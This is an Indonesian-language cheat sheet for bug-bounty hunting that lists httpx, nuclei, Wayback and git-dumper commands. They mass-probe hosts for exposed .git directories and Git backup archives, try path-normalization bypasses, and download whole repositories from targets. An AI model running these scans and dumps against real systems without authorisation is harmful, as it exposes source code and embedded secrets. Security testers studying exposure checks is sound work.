# Git Repository Disclosure

## 1. Cek file Git langsung

```bash
cat hosts.txt | httpx -path "/.git/HEAD" -mc 200 -probe
```

```bash
cat hosts.txt | httpx -path "/.git/config" -mc 200 -probe
```

```bash
cat hosts.txt | httpx -path "/.git/index" -mc 200 -probe
```

```bash
cat hosts.txt | httpx -path "/.git/packed-refs" -mc 200 -probe
```

```bash
cat hosts.txt | httpx -path "/.git/COMMIT_EDITMSG" -mc 200 -probe
```

---

## 2. Cari signature Git

```bash
cat hosts.txt | httpx -path "/.git/HEAD" -mr "refs/heads"
```

```bash
cat hosts.txt | httpx -path "/.git/config" -mr "\[core\]"
```

```bash
cat hosts.txt | httpx -path "/.git/config" -mr "repositoryformatversion"
```

---

## 3. Bypass path normalization

```bash
cat hosts.txt | httpx -path "/.git%2fHEAD"
```

```bash
cat hosts.txt | httpx -path "/.git/.git/HEAD"
```

```bash
cat hosts.txt | httpx -path "/.git//HEAD"
```

```bash
cat hosts.txt | httpx -path "/./.git/HEAD"
```

```bash
cat hosts.txt | httpx -path "/.git;/HEAD"
```

---

## 4. Cek object exposure

```bash
cat hosts.txt | httpx -path "/.git/objects/info/packs"
```

```bash
cat hosts.txt | httpx -path "/.git/info/refs"
```

```bash
cat hosts.txt | httpx -path "/.git/logs/HEAD"
```

```bash
cat hosts.txt | httpx -path "/.git/refs/heads/master"
```

```bash
cat hosts.txt | httpx -path "/.git/refs/heads/main"
```

---

## 5. Nuclei khusus Git

```bash
nuclei -l hosts.txt \
-t exposures/configs/git-config.yaml \
-t exposures/files/git-head.yaml \
-t exposures/files/git-directory-listing.yaml
```

Atau:

```bash
nuclei -l hosts.txt -tags git
```

---

## 6. Setelah ketemu HEAD

Kalau `/.git/HEAD` 200:

```bash
git-dumper https://target.com/.git/ dump/
```

atau

```bash
GitTools/Dumper/gitdumper.sh \
https://target.com/.git/ dump/
```

---

## 7. Cari Git dari Wayback

```bash
cat domains.txt | waybackurls | grep "\.git"
```

```bash
cat domains.txt | gau | grep "\.git"
```

```bash
cat domains.txt | katana -silent | grep "\.git"
```

---

## 8. Cari file backup Git

Sering lebih banyak dapet daripada `.git` langsung.

```bash
cat hosts.txt | httpx -path "/.git.zip"
```

```bash
cat hosts.txt | httpx -path "/git.zip"
```

```bash
cat hosts.txt | httpx -path "/.git.tar.gz"
```

```bash
cat hosts.txt | httpx -path "/git.tar.gz"
```

```bash
cat hosts.txt | httpx -path "/backup.zip"
```

```bash
cat hosts.txt | httpx -path "/website.zip"
```

```bash
cat hosts.txt | httpx -path "/source.zip"
```

---

Kalau buat workflow bug bounty massal, biasanya urutan paling efektif:

```bash
1. /.git/HEAD
2. /.git/config
3. /.git/index
4. /.git/info/refs
5. /.git/logs/HEAD
6. git backup files (.git.zip, git.tar.gz)
7. nuclei -tags git
8. git-dumper
```

Karena 90% temuan valid biasanya muncul dari `HEAD`, `config`, `index`, atau backup archive, bukan dari directory listing.
